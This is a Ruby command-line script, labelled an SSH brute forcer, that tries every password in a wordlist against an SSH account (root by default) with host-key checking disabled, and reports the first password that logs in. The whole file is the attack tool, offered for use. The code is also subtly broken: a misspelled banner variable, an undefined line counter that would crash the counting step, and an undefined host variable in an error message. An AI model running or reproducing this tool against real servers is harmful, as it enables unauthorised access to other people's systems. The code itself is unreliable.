#!/bin/ruby
require 'slop'
require 'net/ssh'
$banenr="SSH BRUTE FORCER"

def parse()
 $options = Slop.parse suppress_errors: true do |argument|
  argument.string 'host', 'IP of server(default-localhost)',required:true
  argument.integer '-p','--port', 'Custom port', default: 22
  argument.string '-u', '--user', 'Username(default-root)',default: 'root', required:true
  argument.string '-w','--wordlist','Path to wordlist(default-john dictionary)',default: "dic/john.txt"
  argument.bool '-v', '--verbose', 'Enable verbose', default: false
  argument.on '--help' do 
   print (argument)
   exit()
  end
 end
end
def main()
 print($banner)
 parse()
 read_word()
 crack()
end
def crack()
 File.open($options[:wordlist],'r') do |wordlist_file|
  wordlist_file.each do |passwd|
   begin
    Net::SSH.start($options[:host],$options[:user],:password=>passwd.strip(),:auth_methods => ["password"],:port => $options[:port],:verify_host_key => :never, :non_interactive => true) do |ssh|
     print("\nFound password:#{passwd}")
     exit()
    end
   rescue Net::SSH::Authentication::DisallowedMethod
    print("\nError(Password authentication isn't allowed on #{$host})")
    exit()
   rescue Net::SSH::AuthenticationFailed
    print("\nWrong password:#{passwd}") if $options.verbose?
   end 
  end
  print("\nPassword isn't found")
  exit()
 end
end
def read_word()
    number_of_lines=0
    File.open($options[:wordlist], 'r') do |file|
        file.each do |count|
            number_of_line+=1
        end
        print("\nFound:#{number_of_lines.to_s} passwords") if $options.verbose?
    end
end
main()
